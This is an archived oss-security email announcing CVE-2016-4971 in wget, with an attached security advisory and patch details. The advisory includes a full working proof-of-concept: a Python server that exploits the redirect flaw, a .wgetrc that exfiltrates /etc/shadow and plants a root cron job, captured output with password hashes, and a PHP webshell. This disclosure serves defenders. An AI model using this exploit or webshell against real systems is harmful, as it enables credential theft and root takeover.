X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["18368" "Saturday" "9" "July" "2016" "22:24:58" "+0300" "Solar Designer" "solar@openwall.com" "<20160709192458.GA30952@openwall.com>" "555" "[oss-security] CVE-2016-4971: wget < 1.18 trusts server-provided filename on HTTP to FTP redirects" nil nil nil "7" "2016070919:24:58" "[oss-security] CVE-2016-4971: wget < 1.18 trusts server-provided filename on HTTP to FTP redirects" (number mark "U       solar@openwa Jul  9  555/18368 " thread-indent "\"[oss-security] CVE-2016-4971: wget < 1.18 trusts server-provided filename on HTTP to FTP redirects\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28029 invoked by uid 550); 9 Jul 2016 19:25:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28011 invoked from network); 9 Jul 2016 19:25:05 -0000
Date: Sat, 9 Jul 2016 22:24:58 +0300
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20160709192458.GA30952@openwall.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="gBBFr7Ir9EOA20Yy"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
User-Agent: Mutt/1.4.2.3i
Subject: [oss-security] CVE-2016-4971: wget < 1.18 trusts server-provided filename on HTTP to FTP redirects

--gBBFr7Ir9EOA20Yy
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

In 2010, several command-line programs were fixed to distrust filenames
provided by HTTP servers via Location and Content-Disposition headers.
wget gained --trust-server-names and --content-disposition options to
let users revert to the old (risky) behavior.

http://www.ocert.org/advisories/ocert-2010-001.html
http://www.openwall.com/lists/oss-security/2010/05/17/1
http://www.openwall.com/lists/oss-security/2010/08/17/2

As it turns out, the fix for wget was incomplete, not covering the
special case of HTTP to FTP redirects.  This is addressed in wget 1.18
released a month ago:

https://lists.gnu.org/archive/html/info-gnu/2016-06/msg00004.html

"This version fixes a security vulnerability (CVE-2016-4971) present in
all old versions of wget.  The vulnerability was discovered by Dawid
Golunski which were reported to us by Beyond Security's SecuriTeam.

On a server redirect from HTTP to a FTP resource, wget would trust the
HTTP server and uses the name in the redirected URL as the destination
filename.
This behaviour was changed and now it works similarly as a redirect from
HTTP to another HTTP resource so the original name is used as
the destination file.  To keep the previous behaviour the user must
provide --trust-server-names."

Upstream commit:

http://git.savannah.gnu.org/cgit/wget.git/commit/?id=e996e322ffd42aaa051602da182d03178d0f13e1

Exploit:

http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt

(also attached to this message).  A component of the attack - making
wget download a .wgetrc first - was described here:

http://www.openwall.com/lists/oss-security/2010/05/18/13

but there are also new tricks: the HTTP to FTP redirect, and the use of
post_file to make wget POST a file from the server with the cron job.

Alexander

--gBBFr7Ir9EOA20Yy
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt"
Content-Transfer-Encoding: 8bit

=============================================
- Release date: 06.07.2016
- Discovered by: Dawid Golunski
- Severity: High
- CVE-2016-4971
=============================================


I. VULNERABILITY
-------------------------

GNU Wget < 1.18       Arbitrary File Upload / Potential Remote Code Execution


II. BACKGROUND
-------------------------

"GNU Wget is a free software package for retrieving files using HTTP, HTTPS and 
FTP, the most widely-used Internet protocols. 
It is a non-interactive commandline tool, so it may easily be called from 
scripts, cron jobs, terminals without X-Windows support, etc.

GNU Wget has many features to make retrieving large files or mirroring entire 
web or FTP sites easy
"

https://www.gnu.org/software/wget/


III. INTRODUCTION
-------------------------

GNU Wget before 1.18 when supplied with a malicious URL (to a malicious or 
compromised web server) can be tricked into saving an arbitrary remote file 
supplied by an attacker, with arbitrary contents and filename under 
the current directory and possibly other directories by writing to .wgetrc.
Depending on the context in which wget is used, this can lead to remote code 
execution and even root privilege escalation if wget is run via a root cronjob 
as is often the case in many web application deployments. 
The vulnerability could also be exploited by well-positioned attackers within
the network who are able to intercept/modify the network traffic.


IV. DESCRIPTION
-------------------------

Because of lack of sufficient controls in wget, when user downloads a file 
with wget, such as:

wget http://attackers-server/safe_file.txt

an attacker who controls the server could make wget create an arbitrary file
with an arbitrary contents and filename by issuing a crafted HTTP 30X Redirect 
containing FTP server reference in response to the victim's wget request. 

For example, if the attacker's server replies with the following response:

HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=UTF-8
Location: ftp://attackers-server/.bash_profile
Content-Length: 262
Server: Apache

wget will automatically follow the redirect and will download a malicious
.bash_profile file from a malicious FTP server. 
It will fail to rename the file to the originally requested filename of 
'safe_file.txt' as it would normally do, in case of a redirect to another 
HTTP resource with a different name. 

Because of this vulnerability, an attacker is able to upload an arbitrary file
with an arbitrary filename to the victim's current directory.

Execution flow:

victim@trusty:~$ wget --version | head -n1
GNU Wget 1.17 built on linux-gnu.

victim@trusty:~$ pwd
/home/victim

victim@trusty:~$ ls
victim@trusty:~$   

victim@trusty:~$ wget http://attackers-server/safe-file.txt
Resolving attackers-server... 192.168.57.1
Connecting to attackers-server|192.168.57.1|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: ftp://192.168.57.1/.bash_profile [following]
           => ‘.bash_profile’
Connecting to 192.168.57.1:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> SIZE .bash_profile ... 55
==> PASV ... done.    ==> RETR .bash_profile ... done.
Length: 55 (unauthoritative)

.bash_profile                                100%[=============================================================================================>]      55  --.-KB/s   in 0s

2016-02-19 04:50:37 (1.27 MB/s) - ‘.bash_profile’ saved [55]


victim@trusty:~$ ls -l
total 4
-rw-rw-r-- 1 victim victim 55 Feb 19 04:50 .bash_profile
victim@trusty:~$ 


This vulnerability will not work if extra options that force destination
filename are specified as a paramter. Such as: -O /tmp/output
It is however possible to exploit the issue with mirroring/recursive options
enabled such as -r or -m.

Another limitation is that attacker exploiting this vulnerability can only
upload his malicious file to the current directory from which wget was run, 
or to a directory specified by -P option (directory_prefix option).
This could however be enough to exploit wget run from home directory, or
within web document root (in which case attacker could write malicious php files
or .bash_profile files).

The current directory limitation could also be bypassed by uploading a .wgetrc 
config file if wget was run from a home directory.

By saving .wgetrc in /home/victim/.wgetrc an attacker could set arbitrary wget
settings such as destination directory for all downloaded files in future,
as well as set a proxy setting to make future requests go through a malicious 
proxy server belonging to the attackers to which they could send further 
malicious responses.


Here is a set of Wget settings that can be helpful to an attacker:

dir_prefix = string
	Top of directory tree—the same as ‘-P string’.

post_file = file
	Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.

recursive = on/off
	Recursive on/off—the same as ‘-r’.

timestamping = on/off
	Allows to overwrite existing files.

cut_dirs = n
	Ignore n remote directory components. Allows attacker to create directories with wget (when combined with recursive option).

http_proxy 
	HTTP Proxy server

https_proxy 
	HTTPS Proxy server

output_document = file
	Set the output filename—the same as ‘-O file’.

input = file
	Read the URLs from string, like ‘-i file’.

metalink-over-http
	Issues HTTP HEAD request instead of GET and extracts Metalink metadata from response headers. 
        Then it switches to Metalink download. If no valid Metalink metadata is found, it falls back to ordinary HTTP download.



Full list of .wgetrc options can be found in:

https://www.gnu.org/software/wget/manual/wget.html#Wgetrc-Commands



V. PROOF OF CONCEPT EXPLOIT
-------------------------


1) Cronjob with wget scenario

Often wget is used inside cronjobs. By default cronjobs run within home 
directory of the cronjob owner.
Such wget cronjobs are commonly used with many applications used to download 
new version of databases, requesting web scripts that perform scheduled tasks 
such as rebuilding indexes, cleaning caches etc. 
Here are a few example tutorials for Wordpress/Moodle/Joomla/Drupal found on 
the Internet with exploitable wget cronjobs:

https://codex.wordpress.org/Post_to_your_blog_using_email
https://docs.moodle.org/2x/ca/Cron
http://www.joomlablogger.net/joomla-tips/joomla-general-tips/how-to-set-up-a-content-delivery-network-cdn-for-your-joomla-site
http://www.zyxware.com/articles/4483/drupal-how-to-add-a-cron-job-via-cpanel

Such setup could be abused by attackers to upload .bash_profile file through
wget vulnerability and run commands in the context of the victim user upon 
their next log-in. 

As cron runs priodically attackers, could also write out .wgetrc file in the 
first response and then write to /etc/cron.d/malicious-cron in the second. 
If a cronjob is run by root, this would give them an almost instant root code 
execution.


It is worth noting that if an attacker had access to local network they could 
potentially modify unencrypted HTTP traffic to inject malicious 30X Redirect 
responses to wget requests.

This issue could also be exploited by attackers who have already gained 
access to the server through a web vulnerability to escalate their privileges. 
In many cases the cron jobs (as in examples above) are set up to request 
various web scripts e.g: 
http://localhost/clean-cache.php 

If the file was writable by apache, and attacker had access to www-data/apache 
account, they could modify it to return malicious Location header and exploit 
root cronjob that runs the wget request in order to escalate their privileges 
to root.


For simplicity we can assume that attacker already has control over the server 
that the victim sends the request to with wget.

The root cronjob on the victim server may look as follows:

root@victim:~# cat /etc/cron.d/update-database
# Update database file every 2 minutes
*/2 * * * * root wget -N http://attackers-server/database.db > /dev/null 2>&1


In order to exploit this setup, attacker first prepares a malicious .wgetrc 
and starts an FTP server:

attackers-server# mkdir /tmp/ftptest
attackers-server# cd /tmp/ftptest

attackers-server# cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

attackers-server# sudo pip install pyftpdlib
attackers-server# python -m pyftpdlib -p21 -w


At this point attacker can start an HTTP server which will exploit wget by
sending malicious redirects to the victim wget's requests:
 
---[ wget-exploit.py ]---

#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '192.168.57.1'
HTTP_LISTEN_PORT = 80
FTP_HOST = '192.168.57.1'
FTP_PORT = 21

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()


---[ eof ]---



Attacker can run wget-exploit.py and wait a few minutes until the victim's server executes
the aforementioned cronjob with wget.

The output should look similar to:


---[ wget-exploit.py output ]---

attackers-server# python ./wget-exploit.py 

Ready? Is your FTP server running?
FTP found open on 192.168.57.1:21. Let's go then

Serving wget exploit on port 80...


We have a volunteer requesting /database.db by GET :)

Uploading .wgetrc via ftp redirect vuln. It should land in /root 

192.168.57.10 - - [26/Feb/2016 15:03:54] "GET /database.db HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@192.168.57.1:21/.wgetrc 

We have a volunteer requesting /database.db by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
root:$6$FsAu5RlS$b2J9GDm.....cut......9P19Nb./Y75nypB4FXXzX/:16800:0:99999:7:::
daemon:*:16484:0:99999:7:::
bin:*:16484:0:99999:7:::
sys:*:16484:0:99999:7:::
sync:*:16484:0:99999:7:::
games:*:16484:0:99999:7:::
man:*:16484:0:99999:7:::
lp:*:16484:0:99999:7:::
...cut...
---[eof]---

Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
192.168.57.10 - - [26/Feb/2016 15:05:54] "POST /database.db HTTP/1.1" 200 -

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 

---[ output eof ]---


As we can see .wgetrc got uploaded by the exploit. It has set the post_file
setting to /etc/shadow.
Therefore, on the next wget run, wget sent back shadow file to the attacker.
It also saved the malicious cronjob script (ROOT_CRON variable) which should 
create a file named /root/hacked-via-wget, which we can verify on the victim's 
server:


root@victim:~# cat /etc/cron.d/wget-root-shell 
* * * * * root /usr/bin/id > /root/hacked-via-wget 

root@victim:~# cat /root/hacked-via-wget 
uid=0(root) gid=0(root) groups=0(root)



2) PHP web application scenario

If wget is used within a PHP script e.g.:

<?php

// Update geoip data

  system("wget -N -P geoip http://attackers-host/goeip.db");	

?>

An attacker who manages to respond to the request could simply upload a PHP
backdoor of:

<?php
	//webshell.php

	system($_GET['cmd']);
?>

by using the wget-exploit script described in example 1.

After the upload he could simply execute the script and their shell
command by a GET request to:

http://victims-php-host/geoip/webshell.php?cmd=id


VI. BUSINESS IMPACT
-------------------------

Affected versions of wget that connect to untrusted (or compromised) web 
servers could be tricked into uploading a file under an arbitrary name, or
even path (if wget is run from a home directory).
Depending on the context in which wget is used, this could lead to
uploading a web shell and granting the attacker access remote access to the
system, or privilege escalation. It could be possible for attackers to escalate
to root user if wget is run via root cronjob as it is often the case in web 
application deployments and is recommended in some guides on the Internet.

The vulnerability could also be exploited by well-positioned attackers within
the networ who are able to intercept/modify the network traffic.

 
VII. SYSTEMS AFFECTED
-------------------------

All versions of Wget before the patched version of 1.18 are affected.
 
VIII. SOLUTION
-------------------------

Update to wget version 1.18 as advertised by the vendor at:

http://lists.gnu.org/archive/html/info-gnu/2016-06/msg00004.html

Linux distributions should update their wget packages. It is recommended
to update wget manually if an updated package is not available for your
distribution.
 
IX. REFERENCES
-------------------------

http://legalhackers.com

http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt

http://lists.gnu.org/archive/html/info-gnu/2016-06/msg00004.html

http://www.ubuntu.com/usn/usn-3012-1/

https://bugzilla.redhat.com/show_bug.cgi?id=1343666#c1

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971

https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-4971

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
dawid (at) legalhackers (dot) com
legalhackers.com
 
XI. REVISION HISTORY
-------------------------

06.07.2016 - Advisory released
 
XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this information.


--gBBFr7Ir9EOA20Yy--
